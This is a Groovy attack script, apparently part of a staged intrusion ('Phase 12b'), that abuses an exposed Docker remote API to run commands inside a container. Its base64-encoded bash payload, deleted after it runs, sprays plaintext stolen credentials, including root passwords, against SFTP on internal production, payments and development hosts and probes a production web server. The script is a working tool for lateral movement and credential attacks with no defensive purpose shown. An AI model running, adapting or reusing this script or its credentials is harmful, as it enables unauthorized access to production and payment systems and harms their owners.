// Phase 12b: Focused SFTP + HTTP on PROD - reduced attempts
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(90000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

// All in one bash script to minimize round trips
def bashScript = '''#!/bin/bash
echo "===== HTTP PROD SEARS ====="
curl -sS -k -m 3 -o /dev/null -w "HTTP: %{http_code} type:%{content_type}" http://172.27.141.24/ 2>&1
echo ""
curl -sS -k -m 3 http://172.27.141.24/ 2>&1 | head -20
echo ""
echo "===== SFTP PROD SEARS (172.27.141.24) ====="
for cred in "eduardo.cruz:xwMyIxfkZZaDNkFg" "root:JenkisLegasy25" "root:xwMyIxfkZZaDNkFg" "jenkins:e6LBqIkOI\\$PR1XX2oia"; do
    user="${cred%%:*}"
    pass="${cred#*:}"
    result=$(curl -sS -k --connect-timeout 3 -u "$user:$pass" sftp://172.27.141.24/ 2>&1)
    rc=$?
    echo "SFTP|$user|rc=$rc|${result:0:100}"
done

echo ""
echo "===== SFTP T1PAGOS (172.27.141.4) ====="
for cred in "eduardo.cruz:xwMyIxfkZZaDNkFg" "root:JenkisLegasy25" "root:JTQ6PrkecY3y1kVN"; do
    user="${cred%%:*}"
    pass="${cred#*:}"
    result=$(curl -sS -k --connect-timeout 3 -u "$user:$pass" sftp://172.27.141.4/ 2>&1)
    rc=$?
    echo "SFTP|$user|rc=$rc|${result:0:100}"
done

echo ""
echo "===== SFTP DEV SEARS (172.27.141.6) ====="
for cred in "eduardo.cruz:xwMyIxfkZZaDNkFg" "root:JenkisLegasy25" "root:1q2w3e4r5t6y"; do
    user="${cred%%:*}"
    pass="${cred#*:}"
    result=$(curl -sS -k --connect-timeout 3 -u "$user:$pass" sftp://172.27.141.6/ 2>&1)
    rc=$?
    echo "SFTP|$user|rc=$rc|${result:0:100}"
done
echo "DONE"
'''

def b64 = bashScript.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_sftp.sh && bash /tmp/_sftp.sh 2>&1; rm -f /tmp/_sftp.sh"
println execIn(cmd)
